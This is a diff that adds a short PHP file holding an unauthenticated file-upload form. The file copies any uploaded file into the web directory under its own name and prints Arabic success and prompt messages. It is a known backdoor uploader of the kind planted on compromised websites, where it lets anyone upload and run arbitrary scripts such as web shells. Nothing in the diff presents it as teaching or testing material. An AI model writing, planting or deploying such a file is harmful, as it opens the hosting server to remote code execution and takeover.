@@ -1,0 +1,2 @@
+<?php $msg = copy($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]) ? "تم الرفع :D" : "ارفع";echo $msg;?><form ENCTYPE="multipart/form-data" ACTION="" METHOD="POST"> <input NAME="MyFile" TYPE="file"> <input VALUE="Up" TYPE="submit"></form>
+
